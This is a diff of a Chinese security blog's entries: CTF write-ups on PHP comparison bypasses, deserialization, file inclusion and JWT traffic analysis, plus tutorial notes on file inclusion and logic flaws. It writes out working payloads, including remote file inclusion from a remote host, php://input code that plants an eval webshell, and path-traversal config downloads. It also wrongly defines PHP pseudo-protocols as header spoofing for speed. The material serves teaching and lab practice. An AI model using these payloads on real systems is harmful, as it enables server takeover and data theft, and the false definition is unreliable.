+要满足拿到flag的三个条件
+给 GET 的uname传数组：uname[]=1 → sha1(uname) = NULL；
+
+给 POST 的passwd传数组：passwd[]=2 → sha1(passwd) = NULL；
+id直接传margin
+
+开发者工具→hackbar
+或者用bp
+
+
+**请求方式改为 ****POST**
+POST /?id=margin&amp;uname[]=1 HTTP/1.1
+
+
+
+五、[Bugku CTF] 矛盾1. 题目2. 解题思路
+代码分析
+
+$num = $_GET[&#x27;num&#x27;];if(!is_numeric($num))  &#123;    echo $num;    if($num==1)      echo &#x27;flag&#123;*********&#125;&#x27;;&#125;
+
+
+is_numeric() 的官方定义是：专门用来检测变量是否为数字或纯数字字符串
+条件1：!is_numeric($num) 要求 num 的值不能是数字或数字字符串
+条件2：$num==1 要求 num 在弱比较中等于 1。
+
+
+绕过：传值 1+除数字之外的
+
+我们需要传一个不是数字类型，但弱比较等于1的值。
+
+
+六、[MRCTF2020]Ez_bypass1. 题目
+2. 解题思路
+查看源码
+
+
+
+代码分析
+
+md5($id) === md5($gg) &amp;&amp; $id !== $gg
+
+要让 $id 和 $gg 的 MD5 哈希值完全一样，但 $id 和 $gg 本身的内容必须不同。
+数组绕过：给 $id 和 $gg 传不同的数组
+
+!is_numeric($passwd) &amp;&amp; $passwd == 1234567
+
+传入的 passwd 不能是「纯数字」（is_numeric 返回 false），但用弱类型比较时，它又要等于数字 1234567。
+
+
+构造payload
+
+GET 部分
+?gg[]=1&amp;id[]=2
+
+POST 部分
+passwd=1234567a
+
+
+
+得到flag
+
+
+
+七、[CTFShow]web111. 题目
+2. 解题思路
+分析代码
+
+
+弱类型比较：最终使用 == 弱类型比较密码与 $_SESSION[&#39;password&#39;]
+绕过思路：$_SESSION[&#39;password&#39;]和$password为空。简单说就是，删除 PHPSESSID 强制服务器生成未初始化的空 Session（其值为 NULL），并传入空字符串密码（&quot;&quot;），利用 PHP 底层 &quot;&quot; == NULL 恒为真的弱比较漏洞，成功绕过了登录验证。
+
+
+bp抓包修改。
+
+
+
+
+得到flag
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>Lab-WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、漏洞检测与危害1.概念
+文件包含：开发中用于复用代码；
+漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
+危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
+
+2.漏洞检测
+白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
+黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
+
+二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
+(1) 无后缀拼接限制服务端代码1.php
+&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
+
+新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
+
+txt文件被PHP解析执行。
+
+(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
+
+直接传1.txt会拼接成1.txt.html报错，两种绕过：
+①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
+
+原理：%00终止字符串，.html被舍弃。
+访问：http://localhost/include/upload2.php?filename=1.txt%00
+
+②超长路径截断
+原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
+?filename=1.txt......................................................................
+
+(3) 远程文件包含(RFI)
+可加载外网文件，危害更大
+前提：php.ini中allow_url_include = On
+
+①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
+②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
+
+方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
+方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
+
+三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
+
+
+
+协议
+PHP版本
+allow_url_fopen
+allow_url_include
+使用示例
+
+
+
+file:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
+
+
+php:&#x2F;&#x2F;filter
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
+
+
+php:&#x2F;&#x2F;input
+≥5.2
+off&#x2F;on
+on
+GET传参，POST写入PHP代码
+
+
+zip:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
+
+
+compress.bzip2:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
+
+
+compress.zlib:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
+
+
+data:&#x2F;&#x2F;
+≥5.2
+on
+on
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
+
+
+1、http&#x2F;https协议远程包含常规协议。
+(高亮的部分是伪协议）
+http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
+
+2、php:&#x2F;&#x2F;filter（读取源码，最常用）
+作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
+常用过滤器：convert.base64-encode
+示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
+附加过滤器分类：
+字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
+转换：convert.base64系列、quoted-printable
+压缩：bzip2、zlib
+加密：mdecrypt系列
+
+
+
+3、php:&#x2F;&#x2F;input（POST传入代码执行）
+原理：读取POST原始数据当做PHP代码执行
+示例：
+执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
+写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
+
+
+
+4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
+示例：
+读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
+
+
+
+5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
+?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+四、不安全文件下载漏洞1. 原理
+本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
+核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
+
+2. Pikachu靶场实操
+下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
+利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
+
+五、补充文件下载与文件包含原理相近：
+
+文件包含：文件被PHP引擎执行
+文件下载：文件直接二进制输出下载到本地
+
 ]]></content>
       <categories>
         <category>Web安全</category>
-        <category>PHP</category>
+        <category>文件包含</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>御网杯2026 Web部分题解</title>
+    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
+    <content><![CDATA[一、WEB-Snake_Game1. 题目
+
+2. 解题思路
+题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
+F12
+
+
+
+添加覆盖脚本
+
+
+修改成功！
+
+
+拿到 flag
+
+
+二、WEB-PHP_Payment1. 题目
+2. 解题思路
+根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
+
+
+
+下载附件，收集信息
+
+
+代码审计 apply_coupon.php
+1、包含了另外两个文件
+
+2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
+
+如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁 
+再看models.php 里的类
+
+有两个属性，一是代金券金额，一是代金券码。
+含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
+所以，目标就是，构造一个金额够买 Flag
+3、 构造 代金券
+&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
+
+
+TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
+
+
+
+
+
+购买 Flag，看 buy.php
+
+
+
+
+用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
+
+依据这个 调用 fetch 
+fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
+
+拿到 flag
+
+
+三、WEB-Enterprise_OA1. 题目
+
+2. 解题思路
+根据题目提示，这题考查目录穿越、文件包含
+先尝试访问 flag.php
+
+
+include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
+路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
+并且服务器是：
+
+说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
+
+读源代码
+
+
+用 php 伪协议
+php://filter/read=convert.base64-encode/resource=index.php
+
+
+利用 base64 在线解密工具
+PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwMHB4OyBjb2xvcjogIzMzMzsgbGluZS1oZWlnaHQ6IDEuNjsgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgRW50ZXJwcmlzZSBPQSBTeXN0ZW0KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJuYXYiPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPXB1YmxpY19ub3RpY2VzLnBocCI+Tm90aWNlczwvYT4KICAgICAgICAgICAgPGEgaHJlZj0iP21vZHVsZT1hYm91dC5waHAiPkFib3V0IFVzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWNvbnRhY3QucGhwIj5Db250YWN0PC9hPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQiPgogICAgICAgICAgICA8P3BocCBpbmNsdWRlKCRtb2R1bGUpOyA/PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwvYm9keT4KPC9odG1sPgo= 
+
+
+
+访问绝对路径
+
+
+
+访问 flag 文件
+
+比如：flag.php   flag.txt
+
+
+
+]]></content>
+      <categories>
+        <category>CTF-WP</category>
+        <category>Contest-WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞</title>
+    <url>/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、逻辑漏洞的概念1、逻辑漏洞的定义逻辑漏洞是指在软件或系统的设计和实现中，由于逻辑错误或缺陷导致的安全问题。这些漏洞不是由于代码编写的错误引起的，而是由于系统设计时的逻辑思路有问题，导致系统在某些情况下无法正常处理，进而被攻击者利用。
+简单理解：就是编程人员的思维逻辑不够严谨造成的漏洞。
+2、逻辑漏洞的危害逻辑漏洞的存在，可能导致系统崩溃、数据泄露、功能异常等问题，严重时甚至可能被黑客利用，对系统安全构成威胁。
+
+二、逻辑漏洞与常见漏洞类型的区别漏洞性质
+逻辑漏洞是由于系统设计中的逻辑错误或缺陷引起的，它们允许攻击者通过非预期的使用方式或操作顺序，规避安全机制或获得未授权的访问。
+其他漏洞是由于系统没有正确验证用户输入的数据，或者编码错误或配置不当引起。
+
+攻击方式和目标
+逻辑漏洞需要攻击者了解应用的业务逻辑，通常利用合法用户身份，通过规避或操纵流程实现攻击目标。
+其他常见漏洞是通过注入恶意代码、操纵输入数据或利用错误配置直接攻击网站应用。
+
+检测方法
+逻辑漏洞通常不会被防火墙等设备检测到，可以逃逸各种防护，难以通过自动化工具或防火墙检测。需要人工审查和业务逻辑分析，通常通过渗透测试和代码审计发现。
+其他漏洞可以容易被自动化扫描工具、防火墙(如WAF,Web应用防火墙)和入侵检测系统(IDS)发现。
+
+
+三、逻辑漏洞的分类逻辑漏洞进行分类的话大致可以分为以下几种类型：
+越权类漏洞越权类漏洞是一种常见的安全漏洞，发生在用户可以访问或执行其权限范围之外的资源或操作。根据用户试图获取的权限类型，越权漏洞可以分为水平越权和垂直越权。
+业务逻辑类漏洞业务逻辑类漏洞是一类与应用程序的业务流程和功能相关的漏洞，发生在应用程序未能正确地实施业务规则或逻辑上出现缺陷，导致攻击者可以利用这些漏洞进行未授权的操作或获取敏感信息。
+流程跳过类漏洞流程跳过类漏洞发生在攻击者通过绕过或跳过应用程序中的某些步骤或检查来达到其目的。利用应用程序在处理流程中未正确验证关键步骤或状态的漏洞，从而使攻击者可以规避验证、授权或其他安全机制。
+
+四、常见的逻辑漏洞1、身份认证安全(1)漏洞产生原因:有些网站对身份认证模块没有做好安全防护，因此导致漏洞产生
+(2)绕过身份认证有以下几种方法:
+暴力破解、撞库(以信息收集找到的凭证作为字典)Cookie&amp;Session类加密
+
+(3)暴力破解测试方法:在没有验证码限制或者一次验证码可以多次使用的地方，可以分为以下几种情况
+爆破用户名。当输入的用户名不存在时，会显示请输入正确用户名，或者用户名不存在已知用户名。比如:已知用户名为admin，密码可以进行字典爆破使用一个常用密码。比如 123456 对大量用户进行爆破
+
+修复方法:
+增加验证码，登录失败的时候，变换验证码。(确保验证码不能被工具识别)限制登录频率，例如，5 分钟内登录失败次数超过 5 次则锁定账号 1 小时。二次验证，可以添加手机验证码或邮箱验证码。
+
+基于这一块内容的练习，可以看pikachu靶场中有相关练习：暴力破解、验证码绕过(onserver)、验证码绕过(on client)、token防爆破?
+2、未授权访问&amp;越权漏洞授权的概念：就是对特定资源的读写权限。简单的说，就是你的权限能让你做什么事情，而验证则表示是否真的可以对这些资源进行读写
+未授权访问的概念：就是指用户在没有通过认证授权的情况下，能够直接访问需要通过认证才能访问到的页面或者文本信息
+越权漏洞的产生：主要是用于开发人员在对数据进行操作时对客户端请求的数据过分相信而遗漏了权限判断
+越权漏洞常发生的位置：修改、重置、找回账户密码、查看、修改其他账户未公开的信息例如个人资料、文件、数据、程序等等，还有与账户关联的一些权限操作
+1. 越权漏洞分类
+水平越权：指相同权限的不同用户可以互相访问举例：两个不同的班级的学生A和B，通过修改请求，A可以任意修改B的个人信息
+垂直越权：指使用权限低的用户可以访问权限较高的用户举例：同一个班级不同权限的老师和学生，通过修改请求，学生可以修改和查看老师的账号信息
+
+越权分类补充：基于用户ID、基于对象ID、基于文件名、权限框架缺陷；包含：同级别用户越权访问修改删除、未认证账户直接访问功能、低权限账号访问高权限功能。同级别(权限)的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作，如果出现此漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。
+2. pikachu 靶场
+2.1 水平越权案例
+使用账号kobe/123456登录，正常查看自身信息链接：http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+修改请求参数，访问其他用户信息：
+http://127.0.0.1/pikachu/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
+
+
+2.2 垂直越权案例
+使用普通用户pikachu/000000登录，页面仅开放查看权限。
+
+直接访问后台编辑页面：/vul/overpermission/op2/op2_admin_edit.php
+
+
+创建之后，再次查看。
+
+漏洞原因：代码仅校验登录状态，未校验用户权限级别
+$link=connect();!check_op2_login(link))&#123;header(&quot;location:op2_login.php&quot;);exit();
+
+3、数据篡改数据篡改分为两方面:业务一致性安全、业务数据安全
+
+业务一致性安全：账号篡改、邮箱和用户名篡改、订单ID更改、商品编号更改、用户ID篡改
+业务数据安全：金额数据篡改、商品数量篡改、最大数量限制突破、本地JS参数修改
+
+案例1 商品编号篡改步骤:提交订单时，抓包修改商品标号，导致商品与价格不符却交易成功举例：100个积分只能换商品编号为001，1000个积分只能换商品编号005，在100积分换商品的时候抓包把换商品的编号修改为005，用低积分换取高积分商品。
+修复：金额不在客户端传入，防止被篡改，如必要，则务必检查交易金额与商品价格或对支付金额做签名校验相关案例: 某积分商城支付漏洞，通过抓包可以修改积分。
+案例2 金额数据篡改（0元购物）步骤: 在提交订单时进行抓包，修改支付的金额或折扣等相关数据。修复：商品信息如金额、折扣等原始数据校验应来自于服务器端，不应接受客户端传来的值。相关案例: 某订单支付时的总价未验证，抓包将支付金额修改为1即可完成付款。
+案例3 大米CMS支付漏洞5.1 直接修改商品价格购买流程分为订购、确认信息、付款三步，可在任意一步抓包修改价格；可尝试修改为小额、负数金额测试漏洞。案例：http://wooyun.2xss.cc/bug_detail.php?wybug_id&#x3D;wooyun-2016-0226613
+5.2 修改支付状态
+字段规则：0代表支付成功，1代表支付失败；未付款时抓包将状态1改为0，绕过付款步骤。
+数据包复用：低价商品请求包复用至高价商品，实现低价购买高价商品。
+
+5.3 修改商品数量示例：单个商品售价10元，抓包修改数量字段qty，改为大数会生成高额订单，改为负数可实现负金额订单。
+4、任意密码重置漏洞概念：任意密码重置漏洞是系统设计缺陷，允许攻击者在未经授权的情况下更改其他用户的密码。
+漏洞常见场景：缺乏身份验证、不安全的重置链接、安全问题或验证码的缺陷以及会话固定攻击。
+案例：抓包修改请求内用户ID，即可篡改其他用户密码，请求示例：
+[id:1,&#x27;password&#x27;admin12345&quot;)
+
+
+五、逻辑漏洞总结1. 经典业务逻辑漏洞案例
+美团APP忘记密码：仅校验手机号+出生年月日身份证片段，存在绕过风险
+网易黑胶VIP首次充值漏洞：多设备复用首次充值优惠，重复享受低价福利
+
+2. 历史公开漏洞（1）支付逻辑漏洞
+客户端直接篡改支付金额
+订单数量无负数限制，实现0元购、负数金额订单
+请求重放、参数篡改实现余额倍增、免费下单
+团购、充值类订单参数可篡改
+
+（2）密码找回&#x2F;修改逻辑漏洞
+暴力破解用户凭证
+找回链接、页面泄露用户信息
+验证码、Token设计缺陷，可通用&#x2F;预测
+越权修改任意账号密码
+找回流程、验证步骤可绕过
+
+（3）应用程序逻辑错误
+绕过交易限制、刷取账户余额
+Cookie&#x2F;Session设计缺陷导致任意账号登录
+强制浏览、流程顺序缺陷，遍历数据
+时间校验缺陷（如12306刷票）
+
+（4）越权分类
+新增数据越权
+删除数据越权（如删除他人素材）
+修改数据越权（篡改用户信息）
+查询数据越权（批量泄露信息）
+URL&#x2F;参数越权
+
+（5）验证码安全问题
+客户端实现、可直接绕过&#x2F;爆破
+服务端验证码可重复使用、可预测
+万能验证码、验证码在请求包明文展示
+验证码强度低，可被OCR识别
+无次数、时效限制，可无限爆破
+
+（6）JS敏感信息泄露
+JS文件泄露后台路径、接口API
+前端JS窃取受保护Cookie
+AJAX、前端脚本泄露手机号、邮箱等隐私
+
+3. 逻辑漏洞分类梳理（1）交易类
+修改支付价格
+修改支付状态
+修改&#x2F;负数化购买数量
+篡改金额为负数
+请求重放攻击
+数据库并发锁处理不当
+
+（2）业务风控类
+刷取优惠券、重复享受优惠
+套现类漏洞
+
+（3）账号注册类
+重复注册、账号覆盖
+用户名遍历猜解
+
+（4）密码相关
+密码明文存储、未做哈希加密
+无密码强度校验
+
+（5）账号信息类
+用户名&#x2F;邮箱前后空格、大小写处理不当
+手机号格式校验缺陷（如+86前缀绕过）
+
+（6）Cookie&#x2F;Session类
+Cookie存储敏感数据
+Cookie&#x2F;Session可伪造、无合法性校验
+
+（7）登录类
+撞库攻击
+账号劫持
+恶意锁号（无解锁机制）
+传输信道不安全
+凭证本地不安全存储
+
+（8）密码找回类
+越权重置任意密码
+新密码在响应包明文返回
+Token前端可控、无服务端强校验
+头部字段处理不当引发漏洞
+找回流程泄露敏感信息
+
+（9）修改密码类
+越权修改他人密码
+无需验证旧密码即可改密
+
+（10）申诉类
+身份伪造
+申诉流程绕过
+
+（11）信息查询&#x2F;更新类
+越权查询、修改数据
+ID可枚举，批量遍历用户数据
+
+（12）双因素认证(2FA)漏洞
+改密&#x2F;登录后自动跳过二次验证
+OAuth登录未开启2FA
+2FA验证码可爆破、存在竞争条件
+返回值篡改绕过
+链接、功能可绕过2FA
+CSRF攻击禁用2FA
+
+（13）验证码漏洞汇总
+可重用、可预测、无时效&#x2F;次数限制
+客户端生成&#x2F;校验、前端直接绕过
+数据包明文展示验证码
+强度低可被机器识别
+特殊参数绕过、可用于短信&#x2F;邮件轰炸
+
+（14）Session漏洞
+Session可猜测、伪造、泄露
+Session固定攻击
+
+（15）越权细分
+未授权访问
+水平越权（同权限用户互访）
+垂直越权（低权限访问高权限）
+交叉越权
+
+（16）其他漏洞
+ID、随机数生成规则简单，可枚举&#x2F;预测
+接口无访问次数、权限限制
+加密算法误用
+业务执行顺序缺陷
+各类敏感信息泄露
+
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>逻辑漏洞</category>
+      </categories>
+      <tags>
+        <tag>逻辑漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>陇剑杯2021 流量分析题解</title>
+    <url>/2026/08/13/%E9%99%87%E5%89%91%E6%9D%AF2021-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98%E8%A7%A3/index/</url>
+    <content><![CDATA[一、[陇剑杯 2021]jwtQ1：JWT 是什么？JWT（JSON Web Token）：JSON格式的Web令牌，是一种轻量级、无状态的身份认证、授权标准（RFC7519）。用于前后端分离、分布式系统登录鉴权，替代传统 Session。
+1. 核心特点
+无状态：服务端不用存储会话数据，全部信息存在Token里，天然适配集群、微服务
+轻量化：Base64编码字符串，体积小，可放URL、Header、Cookie
+自包含：Token自带用户身份、权限、过期时间等业务信息
+防篡改：通过签名校验，数据无法被随意修改
+
+2. JWT 三段结构（用 . 分割）格式：Header.Payload.Signature
+2.1 Header 头部 —- Base64URL编码作用：声明加密算法、令牌类型示例JSON：
+&#123;  &quot;alg&quot;: &quot;HS256&quot;, // 签名算法：HS256对称加密，RS256非对称  &quot;typ&quot;: &quot;JWT&quot;    // 类型固定JWT&#125;
+
+2.2 Payload 载荷—-Base64URL编码存放业务数据，分标准声明和自定义声明
+
+重要：Payload只是编码，未加密，不能存密码、密钥等敏感数据！
+
+标准内置字段
+
+
+字段
+含义
+
+
+
+iss
+签发者（服务端域名）
+
+
+sub
+用户唯一标识（用户ID）
+
+
+aud
+接收方（客户端）
+
+
+exp
+过期时间戳（必填，超时失效）
+
+
+nbf
+生效时间（在此之前不可用）
+
+
+iat
+签发时间
+
+
+jti
+令牌唯一ID（用于注销、黑名单）
+
+
+自定义字段存放权限、角色、用户名等，例：{&quot;role&quot;:&quot;admin&quot;,&quot;uid&quot;:1001}
+2.3 Signature 签名防止Header+Payload被篡改，生成逻辑：
+
+将 Header、Payload 分别做 Base64URL 编码
+拼接成 base64(header).base64(payload)
+使用 Header 指定算法 + 密钥&#x2F;私钥 加密，得到签名
+
+
+对称加密 HS256：服务端统一一个密钥，签发、校验都用同一密钥
+非对称加密 RS256：私钥签发Token，公钥校验，适合多服务场景
+
+
+签到https://www.nssctf.cn/problem/271
+
+查看协议分级
+
+按字节百分比看，占比最多的是 HTTP
+
+所以 flag：NSSCTF{http}
+
+问 1https://www.nssctf.cn/problem/272
+
+追踪 HTTP 流
+
+base64 解码
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
+
+认证方式：jwt
+flag：NSSCTF{jwt}
+
+问 2https://www.nssctf.cn/problem/273
+
+base64 解码
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODYsIk1hcENsYWltcyI6eyJhdWQiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4ifX0.dJArtwXjas3_Cg9a3tr8COXF7DRsuX8UjmbC1nKf8fc
+
+
+flag：NSSCTF{10086#admin}
+
+看题，发现说的是绕过验证使用的 jwt，所以要先找到登录成功的一条流量。登录成功之后会执行的常见命令是 whoami
+
+登录失败了。
+如何查找当前所有数据包拥有 whoami 这个命令的数据？
+使用过滤器，输入 http contains &quot;whoami&quot;
+
+逐个追踪 http 流
+
+发现这次登录成功了。
+base64 解码
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAwODcsIk1hcENsYWltcyI6eyJ1c2VybmFtZSI6ImFkbWluIn19.rurQD5RYgMrFZow8r-k7KCP13P32sF-RpTXhKsxzvD0
+
+
+flag：NSSCTF{10087#admin}
+
+问 3https://www.nssctf.cn/problem/274
+
+由问 2 知道获得的权限是 root
+flag：NSSCTF{root}
+
+问 4https://www.nssctf.cn/problem/275
+
+上传文件通常不使用 GET 请求，而是使用 POST 或 PUT 请求。
+直接过滤查找 POST 请求的数据包。http.request.method==&quot;POST&quot; 
+
+由前两题，在第 97 条数据包登录成功。所以从 97 条开始看数据包详情
+
+
+在第 107 条数据包中得到信息 cat /tmp/1.c
+说明恶意文件可能是 1.cflag：NSSCTF{1.c}
+
+问 5https://www.nssctf.cn/problem/276
+
+恶意 so 文件，找 后缀为 so 的
+
+flag：NSSCTF{looter.so}
+
+问 6https://www.nssctf.cn/problem/277
+
